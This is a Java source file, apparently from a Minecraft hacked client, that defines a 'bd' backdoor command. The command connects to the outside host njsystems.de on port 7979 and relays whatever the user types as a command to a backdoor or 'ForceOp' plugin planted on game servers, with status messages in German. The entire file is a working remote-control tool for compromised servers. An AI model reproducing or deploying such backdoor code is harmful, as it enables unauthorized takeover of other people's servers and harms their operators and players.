package me.bratwurst.module.Commands;

import me.bratwurst.manager.Command;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.util.EnumChatFormatting;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

public class BackdoorCommand extends Command {
    public BackdoorCommand() {
        super("bd", "Backdoor", "Backdoor für das BD Plugin");
    }

    @Override
    public void onCommand(String command, String[] args) {
        try {
            Socket clientSocket = new Socket("njsystems.de", 7979);
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);

            StringBuilder builder = new StringBuilder();
            for (String str : args) {
                builder.append(str).append(" ");
            }

            out.println(builder.toString());
            PlayerUtils.sendMessage(EnumChatFormatting.RED +"Der Command "+ EnumChatFormatting.AQUA + "( "+ builder.toString() + ")" + EnumChatFormatting.RED + " Wurde an den Server Gesendet!");
            clientSocket.close();
        } catch (IOException e) {
            PlayerUtils.sendMessage(EnumChatFormatting.DARK_GRAY + "Das ForceOp Plugin ist nicht auf dem Server!");
        }
    }
}
